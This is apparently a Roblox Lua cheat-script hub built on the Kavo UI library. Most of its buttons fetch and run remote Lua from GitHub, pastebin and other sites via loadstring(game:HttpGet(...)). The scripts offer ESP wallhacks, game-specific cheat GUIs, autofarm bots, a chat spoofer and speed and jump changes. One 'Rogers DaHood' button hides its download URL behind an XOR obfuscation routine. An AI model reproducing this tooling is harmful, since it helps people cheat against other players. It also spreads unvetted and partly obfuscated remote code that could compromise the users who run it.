local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Script Dump v1.2.4", "GrapeTheme")

-- main
local Main = Window:NewTab("ESP")
local MainSection = Main:NewSection("ESP")

MainSection:NewButton("Highlight ESP", "Highlights a players location", function()
    
loadstring(game:HttpGet("https://raw.githubusercontent.com/zeroisswag/universal-esp/main/esp.lua"))()
end)

MainSection:NewButton("Dababy Esp", "letsgooo", function()

    loadstring(game:HttpGet("https://raw.githubusercontent.com/Kitzoon/Roblox-Scripts/main/DaBabyESP.lua", true))()
end)

--GUIS
local GUIS = Window:NewTab("GUIS")
local GUISSection = GUIS:NewSection("GUIS")

GUISSection:NewButton("CheatX", "Universal GUI", function()

    loadstring(game:HttpGet('https://garfieldscripts.xyz/cheatx/scripts/main.lua'))()
end)

GUISSection:NewButton("Zesty ESP", "Universal GUI", function()

    loadstring(game:HttpGet("https://fluxteam.net/scripts/NewESP.lua", true))()
end)

GUISSection:NewButton("Da Hood", "Dahood GUI", function()

    loadstring(game:HttpGet('https://raw.githubusercontent.com/Scrvpter/Pluto/Lua/Loader.Lua', true))()
end)

GUISSection:NewButton("Arsenal", "OP Arsenal GUI", function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/KeoneGithub/KeoneGithub/main/Arsenal",true))()
end)

GUISSection:NewButton("The Wild West", "OP Wild West GUI", function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/KeoneGithub/KeoneGithub/main/WildWestLean"))()
end)

GUISSection:NewButton("Funky Friday", "Autoplayer Funky Friday", function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/funky-friday-autoplay/main/main.lua",true))()
end)

GUISSection:NewButton("SCP-RP", "SCP-RP Script", function()

loadstring(game:HttpGet("https://anomaly.cool/scripts/scp-rp.lua"))()
end)
GUISSection:NewButton("Pls Donate", "Pls Donate Script", function()

loadstring(game:HttpGet('https://raw.githubusercontent.com/tzechco/roblox-scripts/main/PLS%20DONATE/autofarm.lua'))()
end)

GUISSection:NewButton("Pls Donate", "Pls Donate Script", function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/x114/RobloxScripts/main/WordBombSrc"))()
end)

 --DaHood
 local DaHood = Window:NewTab("Dahood")
 local DahoodSection = DaHood:NewSection("Dahood")

DaHoodSection:NewButton("Rogers", "Rogers DaHood Script", function()
 local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10={};for v11=597 -(594 + 2), #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + ((2547 -(397 + 694)) -(1256 + 199)))),v1(v2(v9,1 + ((v11-(2 -1))% #v9),(1371 -(23 + 1347)) + ((v11-(1322 -(245 + 1076)))% #v9) + ((2548 -(1072 + 73)) -((2062 -668) + 8)))))%256));end return v5(v10);end loadstring(game:HttpGet(v7("\193\75\0\152\174\184\134\16\19\129\174\246\135\88\29\156\181\247\203\74\7\141\175\225\198\81\0\141\179\246\135\92\27\133\242\208\198\88\17\154\236\178\153\6\70\199\237\231\204\7\22\138\238\182\202\91\66\139\232\180\207\90\76\142\190\182\204\11\64\140\233\227\152\93\18\139\232\178\134\77\21\159\242\224\203\15\21\221\233\227\157\13\68\209\239\177\204\92\21\218\229\231\202\93\64\221\234\177\152\15\16\220\228\227\200\13\71\142\239\224\207\11\66\199\186\235\218\75\18\129\177\231\152\17\0\144\169","\169\63\116\232\221\130")))();
end)

 --LOCAL PLAYER
 local Player = Window:NewTab("Speed/Jump")
 local PlayerSection = Player:NewSection("Player")

 PlayerSection:NewSlider("Walkspeed", "Makes you a Speedy boy", 500, 16, function(s)
     game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
 end)

 PlayerSection:NewSlider("Jumppower", "Makes You Jump High", 350, 50, function(s)
     game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
 end)

 PlayerSection:NewButton("Reset WS/JP", "Resets to all defaults", function()
     game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
     game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
 end)

     --Other
     local Other = Window:NewTab("Other")
     local OtherSection = Other:NewSection("Other")
 
     OtherSection:NewButton("Chat Spoofer", "Lets you chat for other people", function()
         loadstring(game:HttpGet(('https://pastebin.com/raw/djBfk8Li'),true))()
     end)
 
     OtherSection:NewButton("Bypassed Fly", "Doesn't Work", function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Nicuse/RobloxScripts/main/BypassedFly.lua"))() 
 
         Fly(true)
     end)
